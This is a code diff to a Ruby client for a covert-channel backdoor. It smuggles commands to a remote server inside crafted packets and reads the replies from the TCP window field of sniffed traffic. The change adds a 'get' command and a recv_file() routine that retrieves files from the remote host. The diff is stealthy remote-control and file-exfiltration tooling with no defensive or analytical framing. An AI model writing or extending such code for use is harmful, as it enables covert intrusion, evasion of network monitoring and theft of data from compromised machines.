@@ -36,8 +36,7 @@ cmd.each_byte do | c |
 
 end #cmd.each_byte
     send_fin()
-    recv_command_result(true)
-    prompt() #wait at prompt
+   
 
 end
 
@@ -50,8 +49,8 @@ end
 # Optional argument to display it.
 #
 # -----------------------------------------------------------------------------------------
-def recv_command_result(display = false)
-    output = nil
+def recv_data(display = false)
+    data = nil
     cap = PacketFu::Capture.new(:iface => @options[:iface], :start => true,
                 :promisc => true)    
 
@@ -63,15 +62,18 @@ def recv_command_result(display = false)
             if packet.ip_daddr == @options[:source_ip]
 
                 if packet.tcp_flags.fin == 1 then
-                    
-                    puts "Remote server says:\n \n"+ output #we got a FIN so the server is done sending
-                    return
+                               
+                    return data
                 else
-                    if output.nil? then
-                        output = packet.tcp_win.chr
+                    if data.nil? then
+                        data = packet.tcp_win.chr
                         
                     else #not nill
-                        output << packet.tcp_win.chr
+                        begin
+                            data = data + packet.tcp_win.chr(Encoding::UTF_8)
+                        rescue
+                            
+                        end
                     end 
             end #fin == 1
           end #ptk.tcp_dst 
@@ -85,13 +87,38 @@ end
 
 # -----------------------------------------------------------------------------------------
 #
+#   recv_file()
+#   
+#   Receives a file from the server
+#
+# -----------------------------------------------------------------------------------------
+
+def recv_file()
+    filename = recv_data()
+
+    if filename == '#'
+        puts "Server could not find remote file."
+        return
+    else
+        file = File.open(filename, 'wb')
+    end
+    content = recv_data()
+    content.each_byte do |c|
+        file.putc(c)
+    end
+    file.close()
+
+end
+
+# -----------------------------------------------------------------------------------------
+#
 #   send_char(pkt, c)
 #   
 #   Send a character to the server. pkt = the packet object, c = the character to send    
 #
 # -----------------------------------------------------------------------------------------
 def send_char(pkt, c)
-    cfg = 
+    cfg =  PacketFu::Utils.whoami?(:iface => @options[:iface])
 
     pkt.eth_saddr = @options[:ifconfig][:eth_saddr]
     pkt.ip_saddr = @options[:source_ip]
@@ -152,10 +179,17 @@ def prompt
         abort("Program recieved exit code... quiting");
     end
     #if put is entered, get the following value  
-    if cmds[0] == 'put'
+    if cmds[0] == 'get'
+        send_command(command)
+        recv_file()
+    
+    elsif cmds[0] == 'put'
         send_file(cmds[1])
     else
         send_command(command)
+        data = recv_data()
+        puts "Remote server says \n" + data
+        prompt() #wait at prompt        
     end
     
 end
